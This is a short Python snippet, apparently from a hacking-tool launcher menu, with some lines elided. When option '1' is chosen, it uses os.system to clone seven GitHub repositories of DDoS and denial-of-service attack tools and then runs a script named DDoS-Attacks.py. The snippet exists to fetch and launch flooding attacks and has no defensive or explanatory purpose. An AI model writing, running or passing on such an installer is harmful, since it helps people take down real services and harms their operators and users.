...
if bhydra == '01' or bhydra == '1':
	...
	os.system(' clear ')
	os.system(' git clone https://github.com/MHProDev/MHDDoS && git clone https://github.com/Rebrithed-Reaperr/DRAPE && git clone https://github.com/Ha3MrX/DDos-Attack && git clone https://github.com/epsylon/ufonet && git clone https://github.com/Taguar258/Raven-Storm && git clone https://github.com/Leeon123/CC-attack && git clone https://github.com/codingplanets/Overload-DoS && python2 DDoS-Attacks.py')
